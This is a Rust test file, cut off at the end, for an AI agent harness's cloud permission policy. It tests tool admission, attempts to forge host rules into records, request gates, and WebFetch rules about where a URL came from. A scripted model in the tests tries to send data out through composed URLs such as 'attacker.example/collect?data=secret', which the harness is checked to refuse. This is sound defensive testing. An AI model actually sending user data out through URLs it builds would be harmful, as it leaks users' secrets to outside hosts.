//! The cloud's composition of a Chat without a Folder: `ToolPolicy::durable_chat`, durable waits,
//! Auto without a reviewer, a host that denies whatever would prompt, and the host's rules. Every
//! tool the model is offered is admitted by a rule or by its own class, never by review or a
//! prompt; the host's rules are a source of their own that no user rule or record can edit or
//! forge, and the requests to the model's vendor pass the host's gates one at a time.

use std::collections::BTreeSet;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};
use tickloop_agent_model::{ModelClient, ModelDelta, ModelError, ModelOutput, ModelRequest};
use tickloop_agent_protocol::{
    AgentHostOptions, ChatId, Content, Decision, EventKind, OperationState, PermissionRule,
    PromptPolicy, QuestionAnswer, Role, SUBAGENT_TOOL_NAME, Usage,
};
use tickloop_agent_runtime::transcript::{StorePosition, TranscriptStore};
use tickloop_agent_runtime::{
    Agent, Delivery, HarnessOptions, HarnessSeams, ParentSelection, QuestionReply, Quiescence,
    ToolPolicy, TurnOp, TurnRequest, UserMessage, WaitHosting, durable_chat_host_rules,
    mcp_tools::McpHostToolProvider,
};
use tickloop_agent_test_support::harness::ChosenModels;
use tickloop_agent_test_support::routed::{RoutedModel, has_tool_result, tool_result};
use tickloop_agent_test_support::transcripts::InMemoryTranscriptStore;
use tickloop_agent_test_support::{call, config, single_question, text};
use tickloop_agent_tools::permissions::{PermissionPolicyExt, RuleSource};
use tickloop_agent_transcript::{Line, SettledOutcome};
use tokio_util::sync::CancellationToken;
use uuid::Uuid;

use super::mcp_tools::artifact_service::{ArtifactService, CREATED_ARTIFACT};

const WAIT: Duration = Duration::from_secs(20);
const ROOT_PROMPT: &str = "Use every tool you have once.";
const CHILD_TASK: &str = "Check the delivery date and report back.";

/// The cloud's composition: what the private host configures for every Harness.
fn cloud_options(host_rules: Vec<PermissionRule>) -> HarnessOptions {
    HarnessOptions {
        host: AgentHostOptions {
            prompt_policy: PromptPolicy::DenyOnPrompt,
            ..AgentHostOptions::product_defaults()
        },
        tools: ToolPolicy::durable_chat(),
        host_rules,
        task_tools: Some(true),
        waits: WaitHosting::Durable,
        ..HarnessOptions::local(config())
    }
}

fn cloud_harness(
    store: Arc<dyn TranscriptStore>,
    model: Arc<dyn ModelClient>,
    options: HarnessOptions,
) -> Agent {
    Agent::with_seams(
        HarnessSeams {
            transcripts: Some(store),
            environment: None,
            models: ChosenModels::new(model),
        },
        options,
    )
    .unwrap()
}

fn prompt(text: &str) -> TurnRequest {
    TurnRequest {
        input_id: Uuid::new_v4(),
        op: TurnOp::Continue {
            after: ParentSelection::CurrentLeaf,
            message: UserMessage {
                text: text.into(),
                ..Default::default()
            },
        },
        delivery: Delivery::Queue,
        host_context: None,
    }
}

/// Whether the request belongs to the Chat whose first prompt contains `marker`.
fn starts_with_prompt(request: &ModelRequest, marker: &str) -> bool {
    request
        .messages
        .iter()
        .filter(|message| message.role == Role::User)
        .any(|message| {
            message
                .content
                .iter()
                .any(|content| matches!(content, Content::Text { text } if text.contains(marker)))
        })
}

/// A page server on the loopback interface that answers every request with the same page.
async fn page_server() -> String {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        while let Ok((mut socket, _)) = listener.accept().await {
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut buffer = [0; 1024];
                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
                    let Ok(length) = socket.read(&mut buffer).await else {
                        return;
                    };
                    if length == 0 {
                        return;
                    }
                    request.extend_from_slice(&buffer[..length]);
                }
                let body = "<p>Delivery is on Friday.</p>";
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = socket.write_all(response.as_bytes()).await;
            });
        }
    });
    format!("http://localhost:{port}/delivery")
}

/// The root calls each of its tools once, in this order, then finishes; the child hands back.
fn every_tool_model(page: String) -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(move |request| {
        // WebFetch asks the Chat's model about the page it fetched.
        if request.tools.is_empty() {
            return text("Delivery is on Friday.");
        }
        if starts_with_prompt(request, CHILD_TASK) {
            return if has_tool_result(request, "handback") {
                text("Nothing more.")
            } else {
                call(
                    "handback",
                    "SubagentHandback",
                    json!({"message": "Delivery is on Friday."}),
                )
            };
        }
        if !starts_with_prompt(request, ROOT_PROMPT) {
            return text("Done.");
        }
        let task = tool_result(&request.messages, "create").map(|result| result["task"].clone());
        let steps: Vec<(&str, &str, Value)> = vec![
            (
                "fetch",
                "WebFetch",
                json!({"url": page, "prompt": "When is the delivery?"}),
            ),
            (
                "create",
                "TaskCreate",
                json!({"mutation_id": Uuid::from_u128(1), "title": "Check", "description": "Check the delivery"}),
            ),
            ("list", "TaskList", json!({})),
            (
                "get",
                "TaskGet",
                json!({"task_id": task.as_ref().map(|task| task["id"].clone())}),
            ),
            (
                "claim",
                "TaskUpdate",
                json!({"mutation_id": Uuid::from_u128(2), "task_id": task.as_ref().map(|task| task["id"].clone()), "expected_revision": 1, "action": "claim"}),
            ),
            (
                "delegate",
                SUBAGENT_TOOL_NAME,
                json!({"task": CHILD_TASK, "name": "helper"}),
            ),
            ("members", "ListSubagents", json!({})),
            (
                "skill",
                "Skill",
                json!({"skill": "tickloop-artifacts:artifact-slides"}),
            ),
            (
                "resources-list",
                "ListMcpResourcesTool",
                json!({"server": "tickloop-artifacts"}),
            ),
            (
                "resource-read",
                "ReadMcpResourceTool",
                json!({"server": "tickloop-artifacts", "uri": "fixture://tickloop-artifacts/info"}),
            ),
            (
                "message",
                "SendMessage",
                json!({"to": "helper", "message": "Thanks."}),
            ),
            ("stop", "StopSubagent", json!({"to": "helper"})),
            (
                "read",
                "ArtifactRead",
                json!({"action": "read", "artifact_id": "doc"}),
            ),
            (
                "patch",
                "ArtifactEdit",
                json!({"action": "patch", "artifact_id": "doc", "patches": [{"type": "replace", "target": "b1", "expected_hash": "h1", "text": "# Friday"}]}),
            ),
            (
                "reply",
                "ArtifactComment",
                json!({"action": "reply", "artifact_id": "doc", "thread_id": "thread-1", "text": "Friday"}),
            ),
            (
                "schedule",
                "CronCreate",
                json!({"cron": "7 9 * * *", "prompt": "Check the delivery page."}),
            ),
            ("schedules", "CronList", json!({})),
            ("ask", "AskUserQuestion", single_question("Which format?")),
        ];
        for (id, name, input) in steps {
            if !has_tool_result(request, id) {
                return call(id, name, input);
            }
        }
        text("All tools used.")
    }))
}

/// The scheduled task tools a cloud Chat offers but reviews: nothing else checks a deletion or a
/// reschedule, while a task the Agent creates waits for the user's confirmation.
const REVIEWED_SCHEDULED_TASK_TOOLS: [&str; 2] = ["CronDelete", "ScheduleWakeup"];

/// Records whether any call was reviewed or put to a person.
fn watch_admissions(agent: &Agent) -> Arc<Mutex<Vec<String>>> {
    let seen = Arc::new(Mutex::new(Vec::new()));
    let mut events = agent.subscribe();
    let recorded = seen.clone();
    tokio::spawn(async move {
        loop {
            match events.recv().await {
                Ok(event) => match event.kind {
                    EventKind::ApprovalAssessed { assessment } => recorded
                        .lock()
                        .unwrap()
                        .push(format!("assessed {}", assessment.call_id)),
                    EventKind::PermissionRequested { request } => recorded
                        .lock()
                        .unwrap()
                        .push(format!("asked {}", request.name)),
                    _ => {}
                },
                Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => {
                    recorded.lock().unwrap().push("lagged".into())
                }
                Err(tokio::sync::broadcast::error::RecvError::Closed) => break,
            }
        }
    });
    seen
}

async fn eventually<T>(mut probe: impl AsyncFnMut() -> Option<T>) -> T {
    tokio::time::timeout(WAIT, async {
        loop {
            if let Some(found) = probe().await {
                return found;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .expect("the condition was reached")
}

/// Every tool a cloud Chat offers its model is admitted without review or a prompt: WebFetch of
/// a URL the user gave and the Subagent call by the host's rules, and the writes to an Artifact
/// the user shared with the Chat by that Artifact's provenance. Nothing is denied. Deleting or
/// rescheduling a scheduled task is the exception: it is reviewed, see
/// `deleting_a_scheduled_task_is_reviewed_under_the_cloud_composition`.
#[tokio::test]
async fn every_catalog_tool_is_admitted_without_review_or_a_prompt_under_the_cloud_composition() {
    let service = ArtifactService::start().await;
    service.control.skills_enabled.store(true, Ordering::SeqCst);
    let credentials = tempfile::tempdir().unwrap();
    let account = service.login(credentials.path()).await;
    let page = page_server().await;
    let model = every_tool_model(page.clone());
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        model.clone(),
        HarnessOptions {
            // The page server listens on the loopback interface.
            tools: ToolPolicy {
                folderless_reach: tickloop_agent_base::network::Reach::Anywhere,
                ..ToolPolicy::durable_chat()
            },
            ..cloud_options(durable_chat_host_rules())
        },
    );
    agent
        .install_host_tools(Arc::new(McpHostToolProvider::new(account, None)))
        .unwrap();
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    agent.share_artifact(root, "doc").await.unwrap();
    let request = prompt(&format!("{ROOT_PROMPT} The delivery page is {page}."));
    agent.advance(root, request.clone()).await.unwrap();
    let question = eventually(async || {
        agent
            .snapshot(root)
            .await
            .unwrap()
            .questions
            .first()
            .cloned()
    })
    .await;
    agent
        .advance(
            root,
            TurnRequest {
                input_id: Uuid::new_v4(),
                op: TurnOp::Answer {
                    request: question.id,
                    reply: QuestionReply::Answered(vec![QuestionAnswer::other("Weekly")]),
                },
                delivery: Delivery::Queue,
                host_context: None,
            },
        )
        .await
        .unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));

    let offered = model
        .requests
        .lock()
        .unwrap()
        .iter()
        .find(|request| starts_with_prompt(request, ROOT_PROMPT) && !request.tools.is_empty())
        .unwrap()
        .tools
        .iter()
        .map(|tool| tool.name.clone())
        .filter(|name| !REVIEWED_SCHEDULED_TASK_TOOLS.contains(&name.as_str()))
        .collect::<BTreeSet<_>>();
    let snapshot = agent.snapshot(root).await.unwrap();
    let called = snapshot
        .operations
        .iter()
        .map(|operation| operation.name.clone())
        .collect::<BTreeSet<_>>();
    assert_eq!(offered, called, "the root called every tool it was offered");
    for operation in &snapshot.operations {
        assert_eq!(
            operation.state,
            OperationState::Completed,
            "{} {:?}",
            operation.name,
            operation.result
        );
    }
    assert!(
        admissions.lock().unwrap().is_empty(),
        "{:?}",
        admissions.lock().unwrap()
    );
    for chat in std::iter::once(root).chain(
        agent
            .subagents(root)
            .await
            .unwrap()
            .into_iter()
            .map(|member| member.child_chat_id),
    ) {
        assert!(
            agent.recent_denials(chat).await.unwrap().records.is_empty(),
            "{chat}"
        );
    }
    let calls = service
        .tool_calls()
        .iter()
        .map(|call| call["name"].as_str().unwrap().to_owned())
        .collect::<Vec<_>>();
    assert_eq!(calls, ["ArtifactRead", "ArtifactEdit", "ArtifactComment"]);
    agent.shutdown().await;
}

fn subagent_model() -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(|request| {
        if starts_with_prompt(request, CHILD_TASK) {
            return if has_tool_result(request, "handback") {
                text("Nothing more.")
            } else {
                call(
                    "handback",
                    "SubagentHandback",
                    json!({"message": "Delivery is on Friday."}),
                )
            };
        }
        if has_tool_result(request, "delegate") {
            text("Delegated.")
        } else {
            call(
                "delegate",
                SUBAGENT_TOOL_NAME,
                json!({"task": CHILD_TASK, "name": "helper"}),
            )
        }
    }))
}

/// The text of the Subagent call's result.
fn subagent_result(agent_snapshot: &tickloop_agent_protocol::ChatSnapshot) -> String {
    agent_snapshot
        .messages
        .iter()
        .flat_map(|message| &message.content)
        .find_map(|content| match content {
            Content::ToolResult {
                tool_use_id,
                content,
                ..
            } if tool_use_id == "delegate" => Some(content.text().into_owned()),
            _ => None,
        })
        .expect("the Subagent call has a result")
}

/// A user rule that borrows a host rule's id is still the user's: under Auto it does not spare a
/// Subagent call its review, and with no reviewer and no person the call is refused. Replacing
/// the user's rules leaves the host's untouched.
#[tokio::test]
async fn a_user_rule_with_a_host_rules_id_is_reviewed_and_cannot_replace_the_hosts_rules() {
    let without_subagent = durable_chat_host_rules()
        .into_iter()
        .filter(|rule| rule.tool != SUBAGENT_TOOL_NAME)
        .collect::<Vec<_>>();
    let subagent_rule = durable_chat_host_rules()
        .into_iter()
        .find(|rule| rule.tool == SUBAGENT_TOOL_NAME)
        .unwrap();
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        subagent_model(),
        cloud_options(without_subagent.clone()),
    );
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    agent
        .set_permission_rules(root, vec![subagent_rule.clone()])
        .await
        .unwrap();
    let policy = agent.snapshot(root).await.unwrap().policy;
    assert_eq!(
        policy
            .host_rules
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>(),
        without_subagent
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>(),
        "replacing the user's rules leaves the host's"
    );
    assert_eq!(
        policy
            .explicit_rule_match(SUBAGENT_TOOL_NAME, &json!({}), Uuid::nil(), None)
            .unwrap()
            .source,
        RuleSource::User
    );
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    let snapshot = agent.snapshot(root).await.unwrap();
    assert!(agent.subagents(root).await.unwrap().is_empty());
    assert!(
        admissions
            .lock()
            .unwrap()
            .iter()
            .any(|seen| seen.starts_with("assessed")),
        "the user's Allow went to review"
    );
    let denials = agent.recent_denials(root).await.unwrap().records;
    assert_eq!(denials.len(), 1, "{denials:?}");
    assert!(
        subagent_result(&snapshot).contains("no Folder to review"),
        "{}",
        subagent_result(&snapshot)
    );
    agent.shutdown().await;

    // With the host's own rule, the same call is admitted without review.
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        subagent_model(),
        cloud_options(durable_chat_host_rules()),
    );
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));
    assert_eq!(agent.subagents(root).await.unwrap().len(), 1);
    assert!(admissions.lock().unwrap().is_empty());
    agent.shutdown().await;
}

/// A user's Deny still tightens the host's Allow.
#[tokio::test]
async fn a_user_deny_tightens_the_hosts_allow() {
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        subagent_model(),
        cloud_options(durable_chat_host_rules()),
    );
    let root = agent.create_chat_without_folder().await.unwrap();
    agent
        .set_permission_rules(
            root,
            vec![PermissionRule {
                id: Uuid::new_v4(),
                decision: Decision::Deny,
                tool: SUBAGENT_TOOL_NAME.into(),
                specifier: None,
                input: None,
                loop_id: None,
                persistent: false,
            }],
        )
        .await
        .unwrap();
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    assert!(agent.subagents(root).await.unwrap().is_empty());
    let result = agent.snapshot(root).await.unwrap();
    assert!(
        subagent_result(&result).starts_with("permission denied"),
        "{}",
        subagent_result(&result)
    );
    assert_eq!(agent.recent_denials(root).await.unwrap().records.len(), 1);
    agent.shutdown().await;
}

/// A record that claims host rules, in the field a policy never writes or in the user's rules
/// under a host rule's id, gives them no host authority: a load fills in the rules the loading
/// host has, and a forged rule stays the user's.
#[tokio::test]
async fn host_rules_forged_into_a_record_have_no_host_authority() {
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store.clone(),
        subagent_model(),
        cloud_options(durable_chat_host_rules()),
    );
    let root = agent.create_chat_without_folder().await.unwrap();
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    let child = agent.subagents(root).await.unwrap()[0].child_chat_id;
    agent.shutdown().await;
    agent.sync().await.unwrap();

    let subagent_rule = durable_chat_host_rules()
        .into_iter()
        .find(|rule| rule.tool == SUBAGENT_TOOL_NAME)
        .unwrap();
    let forged_rule = serde_json::to_value(&subagent_rule).unwrap();
    let forged = store
        .lines(child)
        .into_iter()
        .map(|line| {
            if !matches!(line, Line::Delegation(_)) {
                return line;
            }
            let mut value = serde_json::to_value(&line).unwrap();
            let policy = &mut value["delegation"]["ceiling"]["policy"];
            assert!(policy.get("host_rules").is_none(), "{policy}");
            policy["host_rules"] = json!([forged_rule]);
            policy["rules"] = json!([forged_rule]);
            serde_json::from_value(value).unwrap()
        })
        .collect::<Vec<_>>();
    let loaded = Arc::new(InMemoryTranscriptStore::new());
    loaded.seed(root, store.lines(root), StorePosition(1));
    loaded.seed(child, forged, StorePosition(1));
    let without_subagent = durable_chat_host_rules()
        .into_iter()
        .filter(|rule| rule.tool != SUBAGENT_TOOL_NAME)
        .collect::<Vec<_>>();
    let next = cloud_harness(
        loaded,
        subagent_model(),
        cloud_options(without_subagent.clone()),
    );
    next.resume_chat(root).await.unwrap();
    let ceiling = next
        .snapshot(child)
        .await
        .unwrap()
        .delegation
        .unwrap()
        .ceiling
        .policy;
    assert_eq!(
        ceiling
            .host_rules
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>(),
        without_subagent
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>()
    );
    assert_eq!(
        ceiling
            .explicit_rule_match(SUBAGENT_TOOL_NAME, &json!({}), Uuid::nil(), None)
            .unwrap()
            .source,
        RuleSource::User
    );
    next.shutdown().await;
}

/// Answers every request after a short while, counting how many are in flight at once.
struct CountingModel {
    in_flight: AtomicUsize,
    most_in_flight: AtomicUsize,
    requests: AtomicUsize,
}

#[async_trait]
impl ModelClient for CountingModel {
    async fn generate_title(
        &self,
        request: ModelRequest,
        _: tokio::sync::mpsc::UnboundedSender<ModelDelta>,
        _: CancellationToken,
    ) -> Result<ModelOutput, ModelError> {
        Ok(tickloop_agent_test_support::title_output(request))
    }

    fn identity(&self) -> tickloop_agent_protocol::ModelIdentity {
        tickloop_agent_test_support::ScriptedModel::new(vec![]).identity()
    }

    async fn complete(
        &self,
        _: ModelRequest,
        _: tokio::sync::mpsc::UnboundedSender<ModelDelta>,
        _: CancellationToken,
    ) -> Result<ModelOutput, ModelError> {
        let now = self.in_flight.fetch_add(1, Ordering::SeqCst) + 1;
        self.most_in_flight.fetch_max(now, Ordering::SeqCst);
        tokio::time::sleep(Duration::from_millis(20)).await;
        self.in_flight.fetch_sub(1, Ordering::SeqCst);
        self.requests.fetch_add(1, Ordering::SeqCst);
        Ok(ModelOutput {
            private_source: None,
            content: text("summary"),
            usage: Usage::default(),
            stop_reason: "end_turn".into(),
        })
    }
}

/// Four Chats answer and then compact at once behind a holding's gate of four and a node's gate
/// of one: each request to the vendor takes the gates for itself alone, so the requests go one
/// at a time and none waits on a permit another of its own holds.
#[tokio::test]
async fn compactions_behind_the_hosts_request_gates_go_one_at_a_time_without_deadlock() {
    let model = Arc::new(CountingModel {
        in_flight: AtomicUsize::new(0),
        most_in_flight: AtomicUsize::new(0),
        requests: AtomicUsize::new(0),
    });
    let agent = cloud_harness(
        Arc::new(InMemoryTranscriptStore::new()),
        model.clone(),
        HarnessOptions {
            request_gates: vec![
                Arc::new(tokio::sync::Semaphore::new(4)),
                Arc::new(tokio::sync::Semaphore::new(1)),
            ],
            ..cloud_options(durable_chat_host_rules())
        },
    );
    let mut chats: Vec<ChatId> = Vec::new();
    for _ in 0..4 {
        chats.push(agent.create_chat_without_folder().await.unwrap());
    }
    let turns = chats.iter().map(|chat| {
        let agent = agent.clone();
        let chat = *chat;
        async move {
            let request = prompt("Summarize the week.");
            agent.advance(chat, request.clone()).await.unwrap();
            agent.settled_input(chat, request.input_id).await.unwrap();
            agent.compact(chat).await.unwrap();
        }
    });
    tokio::time::timeout(WAIT, futures_util::future::join_all(turns))
        .await
        .expect("no request waits on a permit its own Run holds");
    assert_eq!(model.most_in_flight.load(Ordering::SeqCst), 1);
    assert!(model.requests.load(Ordering::SeqCst) >= 8);
    for chat in chats {
        assert_eq!(agent.quiesce(chat).await, Quiescence::Idle);
    }
    agent.shutdown().await;
}

/// Serves each path its own response: `(path, status line and headers, body)`, with `{port}` in
/// a body or header standing for the site's port; any other path is not found.
async fn site(routes: Vec<(&'static str, String, String)>) -> String {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let routes = Arc::new(
        routes
            .into_iter()
            .map(|(path, head, body)| {
                (
                    path,
                    head.replace("{port}", &port.to_string()),
                    body.replace("{port}", &port.to_string()),
                )
            })
            .collect::<Vec<_>>(),
    );
    tokio::spawn(async move {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        while let Ok((mut socket, _)) = listener.accept().await {
            let routes = routes.clone();
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut buffer = [0; 1024];
                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
                    let Ok(length) = socket.read(&mut buffer).await else {
                        return;
                    };
                    if length == 0 {
                        return;
                    }
                    request.extend_from_slice(&buffer[..length]);
                }
                let request = String::from_utf8_lossy(&request);
                let target = request.split_whitespace().nth(1).unwrap_or("/");
                let path = target.split('?').next().unwrap_or(target).to_owned();
                let (head, body) = routes
                    .iter()
                    .find(|(route, _, _)| *route == path)
                    .map(|(_, head, body)| (head.clone(), body.clone()))
                    .unwrap_or_else(|| ("404 Not Found".into(), String::new()));
                let content_type = if head.contains("Content-Type") {
                    ""
                } else {
                    "\r\nContent-Type: text/html"
                };
                let response = format!(
                    "HTTP/1.1 {head}{content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = socket.write_all(response.as_bytes()).await;
            });
        }
    });
    format!("http://localhost:{port}")
}

/// Fetches each URL in turn, one call per step, then finishes.
fn fetching_model(urls: Vec<String>) -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(move |request| {
        if request.tools.is_empty() {
            return text("Read.");
        }
        for (index, url) in urls.iter().enumerate() {
            let id = format!("fetch-{index}");
            if !has_tool_result(request, &id) {
                return call(&id, "WebFetch", json!({"url": url, "prompt": "Summarize."}));
            }
        }
        text("Done.")
    }))
}

/// The text and error flag of each call's result, in call order.
fn fetch_results(
    snapshot: &tickloop_agent_protocol::ChatSnapshot,
    calls: usize,
) -> Vec<(String, bool)> {
    (0..calls)
        .map(|index| {
            let id = format!("fetch-{index}");
            snapshot
                .messages
                .iter()
                .flat_map(|message| &message.content)
                .find_map(|content| match content {
                    Content::ToolResult {
                        tool_use_id,
                        content,
                        is_error,
                    } if *tool_use_id == id => Some((content.text().into_owned(), *is_error)),
                    _ => None,
                })
                .unwrap_or_else(|| panic!("{id} has a result"))
        })
        .collect()
}

/// A cloud Chat whose WebFetch reaches the loopback interface, where the test's sites listen.
fn fetching_harness(model: Arc<RoutedModel>, host_rules: Vec<PermissionRule>) -> Agent {
    cloud_harness(
        Arc::new(InMemoryTranscriptStore::new()),
        model,
        HarnessOptions {
            tools: ToolPolicy {
                folderless_reach: tickloop_agent_base::network::Reach::Anywhere,
                web_search: true,
                ..ToolPolicy::durable_chat()
            },
            ..cloud_options(host_rules)
        },
    )
}

async fn run_fetches(
    agent: &Agent,
    chat: ChatId,
    user_text: &str,
    calls: usize,
) -> Vec<(String, bool)> {
    let request = prompt(user_text);
    agent.advance(chat, request.clone()).await.unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(chat, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));
    fetch_results(&agent.snapshot(chat).await.unwrap(), calls)
}

fn is_refused_for_provenance((text, is_error): &(String, bool)) -> bool {
    *is_error && text.contains("only fetches a URL that appears exactly in the user's messages")
}

/// WebFetch of the cloud composition takes the URL the user wrote and the links of the pages it
/// read, and refuses a URL the model composed, such as one carrying data in its query.
#[tokio::test]
async fn web_fetch_takes_the_users_urls_and_linked_pages_and_refuses_composed_ones() {
    let base = site(vec![
        (
            "/first",
            "200 OK".into(),
            "<p><a href=\"/second\">second</a> <a href=\"http://127.0.0.1:{port}/second\">elsewhere</a></p>"
                .into(),
        ),
        ("/second", "200 OK".into(), "<p>Second page.</p>".into()),
    ])
    .await;
    let urls = vec![
        format!("{base}/first"),
        format!("{base}/second"),
        format!("{base}/first?note=the-users-secret"),
        "https://attacker.example/collect?data=secret".to_owned(),
        format!("{}/second", base.replace("localhost", "127.0.0.1")),
    ];
    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
    let chat = agent.create_chat_without_folder().await.unwrap();
    let results = run_fetches(&agent, chat, &format!("Read {base}/first please."), 5).await;
    assert!(!results[0].1, "{:?}", results[0]);
    assert!(!results[1].1, "the first page linked it: {:?}", results[1]);
    assert!(is_refused_for_provenance(&results[2]), "{:?}", results[2]);
    assert!(is_refused_for_provenance(&results[3]), "{:?}", results[3]);
    assert!(
        is_refused_for_provenance(&results[4]),
        "a link to another origin gives none: {:?}",
        results[4]
    );
    agent.shutdown().await;
}

/// A redirect to another origin is reported to the model, whose next request is checked again:
/// within the site that redirected, the target exactly as the redirect gave it may be fetched,
/// and nothing composed from it.
#[tokio::test]
async fn a_redirect_within_its_site_is_fetched_only_as_the_redirect_gave_it() {
    let target_site = site(vec![(
        "/landing",
        "200 OK".into(),
        "<p>Landing.</p>".into(),
    )])
    .await;
    // Another port of the same host is another origin of the same site.
    let target = format!("{target_site}/landing");
    let base = site(vec![(
        "/start",
        format!("302 Found\r\nLocation: {target}"),
        String::new(),
    )])
    .await;
    let urls = vec![
        format!("{base}/start"),
        target.clone(),
        format!("{target}?leak=secret"),
    ];
    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
    let chat = agent.create_chat_without_folder().await.unwrap();
    let results = run_fetches(&agent, chat, &format!("Open {base}/start"), 3).await;
    assert!(
        results[0].0.contains("REDIRECT DETECTED"),
        "{:?}",
        results[0]
    );
    assert!(!results[1].1, "{:?}", results[1]);
    assert!(is_refused_for_provenance(&results[2]), "{:?}", results[2]);
    agent.shutdown().await;
}

/// A redirect to another site is reported to the model as before, but its target has no
/// provenance of its own and is not fetched.
#[tokio::test]
async fn a_redirect_to_another_site_is_reported_but_not_fetched() {
    let target_site = site(vec![(
        "/landing",
        "200 OK".into(),
        "<p>Landing.</p>".into(),
    )])
    .await;
    // The same server under an address instead of a name is another site.
    let target = format!("{}/landing", target_site.replace("localhost", "127.0.0.1"));
    let base = site(vec![(
        "/start",
        format!("302 Found\r\nLocation: {target}"),
        String::new(),
    )])
    .await;
    let urls = vec![format!("{base}/start"), target.clone()];
    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
    let chat = agent.create_chat_without_folder().await.unwrap();
    let results = run_fetches(&agent, chat, &format!("Open {base}/start"), 2).await;
    assert!(
        results[0].0.contains("REDIRECT DETECTED"),
        "{:?}",
        results[0]
    );
    assert!(is_refused_for_provenance(&results[1]), "{:?}", results[1]);
    agent.shutdown().await;
}

/// The links a page gave stay vouched for on another host: the Transcript keeps them.
#[tokio::test]
async fn page_links_give_provenance_after_a_handover() {
    let base = site(vec![
        (
            "/first",
            "200 OK".into(),
            "<p><a href=\"/second\">second</a></p>".into(),
        ),
        ("/second", "200 OK".into(), "<p>Second page.</p>".into()),
    ])
    .await;
    let store = Arc::new(InMemoryTranscriptStore::new());
    let options = || HarnessOptions {
        tools: ToolPolicy {
            folderless_reach: tickloop_agent_base::network::Reach::Anywhere,
            ..ToolPolicy::durable_chat()
        },
        ..cloud_options(durable_chat_host_rules())
    };
    let first = cloud_harness(
        store.clone(),
        fetching_model(vec![format!("{base}/first")]),
        options(),
    );
    let chat = first.create_chat_without_folder().await.unwrap();
    let results = run_fetches(&first, chat, &format!("Read {base}/first please."), 1).await;
    assert!(!results[0].1, "{:?}", results[0]);
    first.shutdown().await;
    first.sync().await.unwrap();

    let next = cloud_harness(
        store,
        fetching_model(vec![format!("{base}/first"), format!("{base}/second")]),
        options(),
    );
    next.resume_chat(chat).await.unwrap();
    let results = run_fetches(&next, chat, "Now follow its link.", 2).await;
    assert!(!results[1].1, "{:?}", results[1]);
    next.shutdown().await;
}

/// A URL an earlier search result of the Chat contained may be fetched.
#[tokio::test]
async fn a_search_results_urls_may_be_fetched() {
    let page = site(vec![("/found", "200 OK".into(), "<p>Found.</p>".into())]).await;
    let found = format!("{page}/found");
    let results_body =
        json!({"results": [{"title": "Found", "url": found, "content": "A page"}]}).to_string();
    let search = site(vec![(
        "/search",
        "200 OK\r\nContent-Type: application/json".into(),
        results_body,
    )])
    .await;
    let searched = found.clone();
    let model = Arc::new(RoutedModel::new(move |request| {
        if request.tools.is_empty() {
            return text("Read.");
        }
        if !has_tool_result(request, "search") {
            return call("search", "WebSearch", json!({"query": "delivery"}));
        }
        for (id, url) in [
            ("fetch-0", searched.clone()),
            ("fetch-1", format!("{searched}?x=1")),
        ] {
            if !has_tool_result(request, id) {
                return call(id, "WebFetch", json!({"url": url, "prompt": "Summarize."}));
            }
        }
        text("Done.")
    }));
    let mut host_rules = durable_chat_host_rules();
    host_rules.push(PermissionRule {
        id: Uuid::new_v4(),
        decision: Decision::Allow,
        tool: "WebSearch".into(),
        specifier: None,
        input: None,
        loop_id: None,
